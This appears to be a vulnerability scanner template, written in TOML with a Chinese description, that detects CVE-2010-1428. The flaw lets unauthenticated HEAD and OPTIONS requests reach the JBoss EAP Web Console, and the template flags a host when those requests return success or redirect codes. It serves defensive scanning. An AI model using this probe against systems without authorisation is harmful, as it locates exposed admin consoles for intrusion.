[info]
author = "ave"
description = "检测 Red Hat JBoss EAP Web Console 对非 GET/POST HTTP 方法（如 HEAD、OPTIONS）的访问控制绕过漏洞。攻击者可利用该缺陷未授权访问敏感配置信息。"
id = "POC-AVE-2010-0300"
name = "Red Hat JBoss EAP Web Console Information Disclosure PoC"
severity = "high"
tags = ["ave-2010-0300"]
vuln_id = [
    "CVE-2010-1428",
    "AVE-2010-0300",
]

[poc]
logic = "any"

[[poc.requests]]
method = "HEAD"
path = "/{{BaseURL}}/web-console/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    204,
    301,
    302,
    307,
]
type = "status"

[[poc.requests]]
method = "OPTIONS"
path = "/{{BaseURL}}/web-console/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    204,
    301,
    302,
    307,
]
type = "status"
